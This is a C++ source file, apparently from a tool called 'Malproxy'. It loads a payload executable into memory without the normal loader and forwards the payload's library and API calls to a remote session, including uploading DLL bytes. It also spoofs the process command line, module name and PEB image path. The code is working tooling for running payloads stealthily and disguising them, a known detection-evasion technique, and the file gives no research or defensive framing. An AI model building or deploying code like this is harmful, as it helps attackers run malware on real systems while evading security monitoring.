// RemoteSyscallsClient.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <algorithm>
#include <string> 

#include "MalproxyClientDLLRunner.h"
#include "Framework/MemoryModule.h"
#include "Framework/Utils.h"
#include "Framework/fnptr.h"
#include "Framework/NtHelper.h"

using Buffer = std::vector<unsigned char>;

MalproxyClientRunner& MalproxyClientRunner::InstanceImpl(const std::shared_ptr<MalproxySession>& client)
{
	static MalproxyClientRunner instance(client);
	return instance;
}

MalproxyClientRunner& MalproxyClientRunner::Instance()
{
	return InstanceImpl();
}

void MalproxyClientRunner::Init(const std::shared_ptr<MalproxySession>& client)
{
	InstanceImpl(client);
}

Buffer MalproxyClientRunner::MalproxyReadFile(const std::wstring& path)
{
	HANDLE file = INVALID_HANDLE_VALUE;

	file = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file == INVALID_HANDLE_VALUE)
		THROW("CreateFileA failed with error %d", GetLastError());

	auto file_close = [](HANDLE* handle) { if (handle != nullptr) CloseHandle(*handle); };
	std::unique_ptr<HANDLE, decltype(file_close)> file_guard(&file, file_close);

	uint64_t high = 0;
	uint64_t size = GetFileSize(file, (LPDWORD)&high);
	size = (high << 32) | size;

	if (size == INVALID_FILE_SIZE)
		THROW("GetFileSize failed with error %d", GetLastError());

	std::vector<unsigned char> buffer((unsigned int)size);
	DWORD bytes_read = 0;

	if (!ReadFile(file, &buffer[0], (DWORD)size, &bytes_read, nullptr))
		THROW("ReadFile failed!, GetLastError=%d", GetLastError());

	buffer.resize(bytes_read);
	return buffer;
}

class MalproxyLibraryHookGenerator
{
public:
	MalproxyLibraryHookGenerator() = default;
	virtual ~MalproxyLibraryHookGenerator() = default;

	void loadLibrary(const char* library_name);
	void create_hook(const char* library_name, const char* funciton_name);

private:
	struct LibraryHookData
	{
		std::string library_name;
		std::string function_name;

		bool operator==(const LibraryHookData& data) { return library_name == data.library_name && function_name == data.function_name; }
	};
};

extern std::map<std::string, std::map<std::string, FARPROC>> autogenerated_stubs;

LPSTR WINAPI malproxy_GetCommandLineA(VOID)
{
	return (LPSTR)MalproxyClientRunner::Instance().GetFakeCommandLineA().c_str();
}
LPWSTR WINAPI malproxy_GetCommandLineW(VOID)
{
	return (LPWSTR)MalproxyClientRunner::Instance().GetFakeCommandLineW().c_str();
}
DWORD WINAPI malproxy_GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize)
{
	/*
	 * If the function succeeds, the return value is the length of the string that is copied to the buffer, in characters, not including the terminating null character.
	 * If the buffer is too small to hold the module name, the string is truncated to nSize characters including the terminating null character,
	 * the function returns nSize, and the function sets the last error to ERROR_INSUFFICIENT_BUFFER.
	 */
	if (hModule == nullptr)
	{
		std::string fake_module = MalproxyClientRunner::Instance().GetFakeModuleNameA();
		if (nSize < fake_module.size())
		{
			memcpy(lpFilename, fake_module.c_str(), nSize);
			SetLastError(ERROR_INSUFFICIENT_BUFFER);
			return nSize;
		}
		memcpy(lpFilename, fake_module.c_str(), fake_module.size());
		lpFilename[fake_module.size()] = '\0';
		return (DWORD)fake_module.size();
	}
	return GetModuleFileNameA(hModule, lpFilename, nSize);
}
DWORD WINAPI malproxy_GetModuleFileNameW(HMODULE hModule, LPWSTR lpFilename, DWORD nSize)
{
	if (hModule == nullptr)
	{
		std::wstring fake_module = MalproxyClientRunner::Instance().GetFakeModuleNameW();
		if (nSize < fake_module.size())
		{
			memcpy(lpFilename, fake_module.c_str(), nSize * sizeof(wchar_t));
			SetLastError(ERROR_INSUFFICIENT_BUFFER);
			return nSize;
		}
		memcpy(lpFilename, fake_module.c_str(), fake_module.size() * sizeof(wchar_t));
		lpFilename[fake_module.size()] = L'\0';
		return (DWORD)fake_module.size();
	}
	return GetModuleFileNameW(hModule, lpFilename, nSize);
}

MalproxyClientRunner::MalproxyClientRunner(const std::shared_ptr<MalproxySession>& client) : _client(client)
{
	_hooks = autogenerated_stubs;
	auto kernel32_hooks = _hooks["kernel32.dll"];
	kernel32_hooks.insert({ "GetCommandLineA", (FARPROC)malproxy_GetCommandLineA });
	kernel32_hooks.insert({ "GetCommandLineW", (FARPROC)malproxy_GetCommandLineW });
	kernel32_hooks.insert({ "GetModuleFileNameA", (FARPROC)malproxy_GetModuleFileNameA });
	kernel32_hooks.insert({ "GetModuleFileNameW", (FARPROC)malproxy_GetModuleFileNameW });
	_hooks["kernel32.dll"] = kernel32_hooks;
}

HCUSTOMMODULE MalproxyClientRunner::MalproxyLoadLibrary(const char* dll_name, void* context)
{
	malproxy::LoadLibraryRequest request;
	std::string dll_name_str(dll_name);
	request.set_dll_name(dll_name);
	//HMODULE local_library = LoadLibraryA(dll_name);
	//if (local_library != nullptr)
	//	Instance()._loaded_modules[local_library] = dll_name_str;

	//if (Instance()._hooks.find(dll_name_str) != Instance()._hooks.end())
	auto response = Instance()._client->LoadRemoteLibrary(request);
	HCUSTOMMODULE library = (HCUSTOMMODULE)response.handle().handle();
	if (library == nullptr)
	{
		try
		{
			malproxy::LoadLibraryExRequest request_ex;
			Buffer data = MalproxyReadFile(StringUtils::Utf8ToUtf16(dll_name));
			request_ex.set_dll_name(dll_name);
			request_ex.set_allocated_dll_data(new std::string(data.begin(), data.end()));
			response = Instance()._client->LoadRemoteLibraryEx(request_ex);
		}
		catch (const std::exception&)
		{
			library = nullptr;
		}
	}
	std::transform(dll_name_str.begin(), dll_name_str.end(), dll_name_str.begin(), ::tolower);
	Instance()._loaded_modules[library] = dll_name_str;
	return library;
}

FARPROC MalproxyClientRunner::MalproxyGetProcAddress(HCUSTOMMODULE library, LPCSTR function_name, void* context)
{
	std::string libname = Instance()._loaded_modules[library];
	if (Instance()._hooks.find(libname) != Instance()._hooks.end())
	{
		FARPROC remote_func = Instance()._hooks[libname][function_name];
		if (remote_func != nullptr)
			return remote_func;
	}

	HMODULE local_module = GetModuleHandleA(libname.c_str());
	if (local_module == nullptr)
		local_module = LoadLibraryA(libname.c_str());
	if (local_module == nullptr)
		return nullptr;
	return GetProcAddress(local_module, function_name);
}

void MalproxyClientRunner::MalproxyFreeLibrary(HCUSTOMMODULE module, void* context)
{
	malproxy::FreeLibraryRequest request;
	std::unique_ptr<malproxy::HandleType> handle = std::unique_ptr<malproxy::HandleType>();
	handle->set_handle((uint64_t)module);
	request.set_allocated_handle(handle.release());
	Instance()._client->FreeRemoteLibrary(request);
}

void MalproxyClientRunner::HookPayloadCommandLine(const std::wstring& module_path, const std::wstring& pwd, const std::wstring& arguments)
{
	PRTL_USER_PROCESS_PARAMETERS rtlUserProcParamsAddress = {};
	PROCESS_BASIC_INFORMATION pbi = {};

	// Locating functions
	initialize_native_functions();
	if (!pNtQueryInformationProcess || !pRtlNtStatusToDosError) {
		THROW("Functions cannot be located.");
	}

	const NTSTATUS status = pNtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
	if (!NT_SUCCESS(status)) {
		THROW("NtQueryInformationProcess failed for current process %d. GetLastError: %d", GetCurrentProcessId(), GetLastError());
	}

	// Get the address of ProcessParameters
	const PPEB pebAddress = pbi.PebBaseAddress;
	PRTL_USER_PROCESS_PARAMETERS params = pebAddress->ProcessParameters;

	_command_line = StringUtils::FormatString(L"%s %s", module_path.c_str(), arguments.c_str());
	_module_name = StringUtils::Basename(module_path);
	_command_line_ascii = StringUtils::Utf16ToUtf8(_command_line);
	_module_name_ascii = StringUtils::Utf16ToUtf8(_module_name);
	SetCurrentDirectoryW(pwd.c_str());

	UNICODE_STRING new_image_path = { 0 };
	pRtlCreateUnicodeString(&new_image_path, module_path.c_str());
	pRtlCopyUnicodeString(&params->ImagePathName, &new_image_path);
#if 0
	UNICODE_STRING new_command_line = { 0 };
	UNICODE_STRING new_pwd = { 0 };
	pRtlCreateUnicodeString(&new_command_line, _command_line.c_str());
	pRtlCreateUnicodeString(&new_pwd, pwd.c_str());

	pRtlCopyUnicodeString(&params->CommandLine, &new_command_line);

	//CloseHandle(params->CurrentDirectory.Handle);
	//params->CurrentDirectory.Handle = CreateFileW(pwd.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
	//pRtlCopyUnicodeString(&params->CurrentDirectory.DosPath, &new_pwd);

#endif
}

void MalproxyClientRunner::RunRemote(const std::wstring& module_path, const std::wstring& pwd, const std::wstring& arguments)
{
	CustomLoadLibraryFunc malproxy_load_library = [this](const char* dll_name, void* context) { return MalproxyLoadLibrary(dll_name, context); };
	CustomGetProcAddressFunc malproxy_get_proc_address = [this](HCUSTOMMODULE lib, LPCSTR function_name, void* context) { return MalproxyGetProcAddress(lib, function_name, context); };

	Buffer payload_data = MalproxyReadFile(module_path);
	HookPayloadCommandLine(module_path, pwd, arguments);
	HMEMORYMODULE payload = MemoryLoadLibraryEx(payload_data.data(), payload_data.size(), MemoryDefaultAlloc, MemoryDefaultFree, malproxy_load_library, malproxy_get_proc_address, MemoryDefaultFreeLibrary, nullptr);
	if (MemoryCallEntryPoint(payload) == -1) // Might be because this is DLL
	{
		FARPROC run_func = MemoryGetProcAddress(payload, "Run");
		run_func();
	}
}